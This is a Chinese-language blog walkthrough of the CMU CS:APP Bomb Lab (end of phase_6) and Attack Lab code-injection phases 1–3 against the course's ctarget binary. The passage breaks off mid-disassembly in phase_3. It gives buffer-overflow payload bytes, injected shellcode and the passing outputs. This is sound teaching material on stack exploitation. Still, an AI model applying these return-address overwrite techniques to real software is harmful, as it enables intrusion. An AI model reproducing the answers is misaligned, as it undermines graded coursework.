<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br></pre></td></tr></table></figure>
<p>这是一个循环，此循环依次将由前面步骤获得的 %rsp %rsp+4 等地址处存放的值与1比较，如果相等， 则将 0x6032d0 这个地址存放在 %rsp + %rsi*2 + 0x20 地址处，%rsi 中存放的数字用来判断是否终止循环，从0开始依次加4，等于24时终止此次循环；如果不相等，则再与2比较，并将 0x6032d0 加 8，这又是一个循环：不相等就递增， 直到相等为止，此时将获得的 0x6032d0 递增后的值放入相应地址处；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx</span><br><span class="line">0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi</span><br><span class="line">0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)</span><br><span class="line">0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br></pre></td></tr></table></figure>
<p>第5步中获得的值中，按顺序把下一个值放置于上一个值+8得到的地址中（其实就是在建立链表）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx</span><br><span class="line">0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br></pre></td></tr></table></figure>
<p>循环交替比较链表元素中的大小，前面的值必须大于等于后面的。</p>
<p>根据前面可知输入的字符串中6个数字只能是 123456 的排列组合；第5步中提及的 0x6032d0 中存放的是332，0x6032d8 处存放的是地址，0x6032e0 存放的是 168， 接下内依次是 924、691、477、443；根据第6步得出的结论即链表前一个元素必须比接下来的大，其实就是以我们输入的数据为索引，根据原有的链表建立新的降序链表，那么最后一个应该是  4 3 2 1 6 5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">Starting program: /mnt/e/Program/ipads/training/ics-lab/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&apos;s number 2.  Keep going!</span><br><span class="line">1 311</span><br><span class="line">Halfway there!</span><br><span class="line">0 0</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">YONUFG</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">Congratulations! You&apos;ve defused the bomb!</span><br><span class="line">[Inferior 1 (process 130) exited normally]</span><br></pre></td></tr></table></figure>
<p>最终可以看到我们成功解决了这6个bomb，这个lab让我对汇编和gdb都有了进一步的认知和了解，作为一个没学过编译原理的人，这个lab还是借鉴了很多网上的教程才一步步啃下来的，但整个lab确实很有意思，能感受到由浅到深精心设计出来的，寓教于乐。</p>
<h1 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h1><p>Attack实验分为两个部分，注入攻击和返回值攻击，CI（代码注入）方式来破解的 Ctarget 可执行文件运行栈位置是不变的； ROP（返回值攻击）方式来破解的 Rtarget 这个可执行代码文件的运行时栈位置每次运行 都不同的；而且它在栈中的代码是不可执行的，否则会引起 Segmentation Fault，所以不能用代码注入的方式来破解。</p>
<p>打开Attack lab的文件夹，可以发现里面主要有四个文件：</p>
<ul>
<li>ctarget 用来进行代码注入攻击</li>
<li>rtarget 用来进行返回值攻击</li>
<li>cookie.txt 是一个唯一表示的字符串，可以理解为ID，主要是CMU用来防止学生作弊互相抄答案，里面很多需要攻击的函数，都要将这个作为参数传入</li>
<li>hex2raw 用来将64进制Byte码变成字符串，可用来传入到需要攻击的程序中</li>
</ul>
<h2 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h2><p>这是lab的第一部分，代码注入攻击，ctarget是我们要攻击的程序，题目告诉我们ctarget里有一个叫做test的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void test() &#123;</span><br><span class="line">    int val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    printf(&quot;No exploit. Getbuf returned 0x%x\n&quot;, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据题目的意思这个函数应该是每次都会调用的，然后这个函数会调用一个不安全的getbuf函数，不检查读入的字符串的大小，也不加以任何保护，使得我们可以利用getbuf对其进行代码注入达到攻击的效果，原理如图所示：</p>
<p><img src="https://i.loli.net/2021/10/17/PnhSeJwqE1ZLvjC.jpg" alt="ICS-attack-code-injection.png"></p>
<p>在x86-64机器中，<code>call Q</code>指令会把返回地址即紧跟在<code>call</code>指令后的那条指令的地址压入栈中，并将程序计数器设置为Q的起始地址；对应的<code>ret</code>指令会从栈中弹出返回地址，并把程序计数器设置为该返回地址。被调用者Q的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。而调用者Q的栈帧自栈底到栈顶包括了参数以及返回地址。对于getbuf函数来说，不存在被保存的寄存器，在缓冲区溢出之后，溢出的字符会直接覆盖调用者栈帧中的返回地址。</p>
<h3 id="phase-1-1"><a href="#phase-1-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>第一关要求我们让test不返回，而是getbuf后直接运行一个叫做touch1的函数，其C语言代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];  </span><br><span class="line">    Gets(buf);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>切入点是 getbuf 函数，它调用的 Gets 函数与C库函数 gets 功能类似，但引入了一个 漏洞。它为 buf 这个变量在栈中分配了空间，如果输入的字符串长度超过 BUFFER_SIZE 指定的长度，Gets 就会将多的字符数据覆盖到不属于这个 buf 变量的栈空间中（试试看 <code>./ ctarget 一个超长字符串</code> ，会报 Segment Fault）在调用函数前，会将调用结束后的下一个指令的地址存放于栈中 <code>push %rip</code> ，当调用函数返回时，就会从栈中取回地址并继续运行。所以我们只需要把所需函数地址注入到运行栈，将原先的返回地址覆盖掉即可，在这里就是利用 Gets 函数的漏洞，将这个地址放置于输入的字符串中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line"></span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>将touch1用gdb反汇编，我们得出touch1的入口地址为 0x4017c0，反汇编getbuf 可以看出为了创建这个字符数组 buf 占用了40个内存地址的空间，也就是说最多只能输入40个字符，而当前的栈底部 +8 的位置就存储了此次调用结束后的返回地址。所以我们只需要将 0x4017c0 扩展成 0x004017c0，因为是64位系统，地址占据了8个地址的空间，小端法字节序反过来，所以输入时应该是 c0 17 40 00，前面还应该有40个字符，全填0就可以了，再将填好的文本用 hex2raw 将64进制Byte码变成字符串运行 ctarget 即可。</p>
<p>（然后我发现WSL做这个会出现 <em>Couldn’t map stack to segment at 0x55586000</em> 的问题，就改用了虚拟机）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@debian:~/ipads/training/ics-lab# ./hex2raw &lt; test.txt &gt; phase1.txt</span><br><span class="line">root@debian:~/ipads/training/ics-lab# ./ctarget -qi phase1.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40</span><br></pre></td></tr></table></figure>
<h3 id="phase-2-1"><a href="#phase-2-1" class="headerlink" title="phase_2"></a>phase_2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Misfire!: You called touch2(0x%.8x)\n"</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求在 test 函数中调用 getbuf 函数返回后，进入 touch2 函数调用，同时要求不仅需要代码注入从而跳到别的函数处执行，还要在代码注入中为这个函数准备参数，也就是我们的cookie，即我们需要先把参数 %rdi 的数值设置为 0x59b997fa，再调用touch2，我们来看下touch2的汇编：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>考虑到在ctarget中，栈地址固定以及允许在栈上执行代码，所以我们可以通过缓冲区溢出漏洞将返回地址指定到栈上，在栈上执行相应的指令，为函数touch2设置参数，最后再从栈上返回至touch2函数即可。首先我们为getbuf设置断点拿到%rsp的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run -q</span><br><span class="line">Starting program: /root/ipads/training/ics-lab/ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12	buf.c: 没有那个文件或目录.</span><br><span class="line">(gdb) stepi 2</span><br><span class="line">0x00000000004017af	14	in buf.c</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">=&gt; 0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) info r</span><br><span class="line">rsp            0x5561dc78          0x5561dc78</span><br></pre></td></tr></table></figure>
<p>可以看出 ctarget 在执行 getbuf 开辟空间后 %rsp 位置在 0x5561dc78 处，那么接下来我们就可以开始具体操作了。首先把攻击代码写好，也就是先将cookie值塞入%rdi ，再 pushq touch2 后 retq 即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>然后就其编译再反汇编得到机器码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@debian:~/ipads/training/ics-lab# vi phase2.s</span><br><span class="line">root@debian:~/ipads/training/ics-lab# gcc -c phase2.s </span><br><span class="line">root@debian:~/ipads/training/ics-lab# objdump -d phase2.o &gt; phase2code.txt</span><br><span class="line">root@debian:~/ipads/training/ics-lab# more phase2code.txt </span><br><span class="line"></span><br><span class="line">phase2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>由此我们就可以得到我们最终的文本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
<p>可以看到最后成功完成touch2的要求：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@debian:~/ipads/training/ics-lab# ./ctarget -qi phase2.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</span><br></pre></td></tr></table></figure>
<h3 id="phase-3-1"><a href="#phase-3-1" class="headerlink" title="phase_3"></a>phase_3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Compare string to hex represention of unsigned value*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span>*sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/*Make position of check string unpredictable*/</span></span><br><span class="line">	<span class="keyword">char</span>*s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span>*sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>;       </span><br><span class="line">	<span class="comment">/*Part of validation protocol*/</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这和上一题类似，只是传参需要是构造的字符串首地址，我们将目标字符串通过缓冲区溢出攻击注入到栈段，并且将其首地址设置为 %rdi 即可。然后根据题目advice可以知道，调用hexmatch和strncmp函数的时候会覆盖getbuf原先使用的内存空间。因为我们是在getbuf退栈返回后调用touch3函数，所以touch3及其内部调用的hexmatch会使栈重新增长，这块区域会包括之前getbuf分配到的40个地址空间。首先我们看一眼touch3的具体情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	